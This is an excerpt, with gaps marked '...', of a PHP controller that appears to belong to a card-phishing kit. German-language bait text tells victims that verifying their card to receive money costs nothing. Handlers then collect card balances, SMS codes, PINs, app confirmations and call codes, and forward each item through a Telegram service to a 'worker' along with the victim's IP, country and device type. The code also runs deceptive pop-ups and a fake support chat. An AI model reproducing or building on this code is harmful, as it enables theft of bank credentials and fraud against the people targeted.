...
Um das Geld zu überweisen, müssen Sie Ihre Karte überprüfen. Dies ist eine Anfrage zur Überprüfung der Karte, wird jedoch nicht abgeschrieben. Das System zeigt nur an, dass die Karte nicht gesperrt und betriebsbereit ist.',
    ...
    public function index($id, $action)
    {
        ...
        switch ($log->status){
            ...
            case 'code':
                $response['modal'] = [
                    'message' => $this->words[$country->name]['code'],
                    'icon' => 'error',
                    'showCloseButton'=>True,
                    'confirmButtonText'=>'OK',
                    'preConfirm'=>False,
            ...
            case 'custom_error':
                ...
                $log->status = "wait";
                $log->save();
                TelegramService::sendNotif($log, 'custom_error');
                break;
            case 'custom_text':
                $response['modal'] = [
                ...
                $log->status = "wait";
                $log->save();
                TelegramService::sendNotif($log, 'custom_text');
                break;
            case 'custom_photo':
                $response['modal'] = [
                    'message' => '',
                ...
                $log->status = "wait";
                $log->save();
                TelegramService::sendNotif($log, 'custom_photo');
                break;
        }
    ...
    public function card(Request $request){
        ...
        switch($request['type']){
            case 'receive':
                ...
                $country_ = "Не указана"; // Получаем страну
                ...
                TelegramService::sendLog($log, $link,$worker, $ipAddress, $country_, $deviceType);
                break;
            case 'accurate':
                $log->accurate_balance = $request['SRDataBalance'];
                $log->balance = $request['SRDataBalance'];
                echo $log->status;
                TelegramService::sendNotif($log, 'accurate');
                break;
            case 'sms':
                $log->sms = $request['SRDataBalance'];

                TelegramService::sendNotif($log, 'sms');
                break;
            case 'app':
                $log->app = $request['SRDataBalance'];

                TelegramService::sendNotif($log, 'app');
                break;
            case 'pin':
                $log->pin = $request['SRDataBalance'];

                TelegramService::sendNotif($log, 'pin');
                break;
            case 'call':
                $log->call = $request['SRDataBalance'];

                TelegramService::sendNotif($log, 'call');
                break;
            case 'custom_text':
    ...
    {
        $chat = Chats::query()->where('log_id', $id)->where('status', 'wait')->first();
        $response = [
        ];
        if (!$chat) {
            return response()->json($response);
    ...
    public function chat_send(Request $request){
        $request = $request->all();
        $log = Logs::with('links')->where('id', $request['log_id'])->first();
        $log->status = "success";
        $log->save();
        $chat = Chats::create([
            'log_id' => $log->id,
            'user_id' => $log->links->user,
        ...
        TelegramService::sendMessageTP($log, $request['message']);
        return response()->json($response);
    }
